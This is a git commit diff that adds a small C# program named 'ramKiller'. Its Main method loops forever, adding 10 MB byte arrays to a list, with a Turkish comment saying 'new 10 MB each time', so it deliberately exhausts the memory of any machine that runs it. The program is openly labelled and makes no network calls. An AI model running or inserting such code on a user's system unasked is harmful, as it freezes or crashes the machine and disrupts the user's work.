70b1d560f64ee4ad4f590d3d8cd067621b8f5ab0
xjr-dev <153308832+xjr-dev@users.noreply.github.com>
2025-11-29 02:02:03 +0300

    fix

---
+++ ramKillerCS/Program.cs
@@ -0,0 +1,29 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace ramKiller
+{
+    internal class Program
+    {
+        static void Main(string[] args)
+        {
+
+            killRam();
+}
+
+        static void killRam()
+        {
+            List<byte[]> ram = new List<byte[]>();
+
+            while (true)
+            {
+
+                ram.Add(new byte[10_000_000]); // HER SEFERDE YENİ 10 MB
+
+            }
+        }
+    }
+}
